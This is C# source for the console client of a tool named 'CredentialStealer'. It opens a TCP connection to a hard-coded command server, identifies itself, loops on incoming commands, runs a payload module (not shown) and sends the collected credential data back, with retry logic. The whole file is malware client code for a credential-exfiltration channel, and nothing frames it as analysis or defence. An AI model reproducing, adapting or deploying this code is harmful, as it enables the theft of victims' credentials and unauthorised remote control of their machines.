using CredentialStealer.Entities;
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace CredentialStealer.Client.Console
{
    public class Client
    {
        private const int PORT = 80;
        private const string IP = "127.0.0.1";
        private const string EOF = "<EOF>";

        private const int RETRY_DELAY = 5000;
        public static string ID = "azerty";

        public static byte[] read(NetworkStream clientStream, Encoding encoder)
        {
            byte[] result = new byte[0];
            int tokenSize = Convert.ToBase64String(encoder.GetBytes(EOF)).Length;
            while (true)
            {
                byte[] message = new byte[4096];
                int bytesRead = 0;
                try
                {
                    bytesRead = clientStream.Read(message, 0, 4096);
                }
                catch (Exception exception)
                {
                    System.Console.WriteLine(exception);
                    break;
                }
                if (bytesRead == 0)
                {
                    return result;
                }
                Array.Resize<byte>(ref result, result.Length + bytesRead);
                Array.Copy(message, 0, result, result.Length - bytesRead, bytesRead);
                if (encoder.GetString(result).EndsWith(EOF))
                {
                    break;
                }
            }
            int eofLength = encoder.GetBytes(EOF).Length;
            byte[] truncatedResult = new byte[result.Length - eofLength];
            Array.Copy(result, 0, truncatedResult, 0, truncatedResult.Length);
            return truncatedResult;
        }

        public static void write(NetworkStream clientStream, Encoding encoder, byte[] buffer)
        {
            byte[] plainBuffer = Utils.Utils.ConcatenateBytes(buffer, encoder.GetBytes(EOF));
            clientStream.Write(plainBuffer, 0, plainBuffer.Length);
            clientStream.Flush();
        }

        public Client()
        {
            IPEndPoint serverEndPoint = new IPEndPoint(IPAddress.Parse(IP), PORT);
            try
            {

                TcpClient client = new TcpClient();
                client.Connect(serverEndPoint);
                NetworkStream clientStream = client.GetStream();
                ASCIIEncoding encoder = new ASCIIEncoding();
                Communication.writeString(clientStream, encoder, ID);
                while (true)
                {
                    string command = Communication.readString(clientStream, encoder);
                    if (command == CredentialStealer.Entities.CommandEnum.Exit.ToString())
                    {
                        Communication.writeString(clientStream, encoder, command);
                        break;
                    }
                    PayLoad payload = new PayLoad();
                    PayLoadResult result = payload.Start();
                    if (result.ResultCode == PayLoadResultEnum.Failed)
                    {
                        Communication.writeString(clientStream, encoder, result.Exception.Message);
                    }
                    else if (result.ResultCode == PayLoadResultEnum.Success)
                    {
                        Communication.write(clientStream, encoder, encoder.GetBytes(result.content));
                    }
                }
                client.Close();
            }
            catch (Exception ex)
            {
                throw ex;
            }
            Thread.Sleep(RETRY_DELAY);
        }

        public static void Main(string[] args)
        {
            new Client();
        }
    }
}